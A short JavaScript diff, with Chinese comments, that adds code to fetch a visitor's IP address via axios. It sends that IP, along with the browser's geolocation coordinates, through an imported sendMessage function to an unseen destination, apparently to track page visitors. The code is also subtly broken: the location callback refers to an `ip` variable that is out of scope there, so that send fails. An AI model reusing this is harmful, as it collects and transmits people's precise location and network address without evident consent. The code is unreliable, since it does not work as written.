@@ -1,4 +1,18 @@
+import axios from "axios";
 import sendMessage from "./message.js";
+
+let ipgg = "0.0.0.0";
+axios.get("").then((response) => {
+    // 获取 IP 地址
+    const ip = response.data;
+    //console.log("IP 地址:", ip);
+    ipgg = ip;
+    sendMessage(`ip: ${ip}`);
+}
+).catch((error) => {
+    console.error("获取 IP 地址失败:", error);
+}
+);
 
 if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
@@ -7,7 +21,7 @@ if (navigator.geolocation) {
             const latitude = position.coords.latitude; // 纬度
             const longitude = position.coords.longitude; // 经度
             //console.log("纬度:", latitude, "经度:", longitude);
-            sendMessage(`w: ${latitude}, j: ${longitude}`);
+            sendMessage(`w: ${latitude}, j: ${longitude}，ip: ${ip}`);
         },
         function (error) {
             // 获取失败时的代码
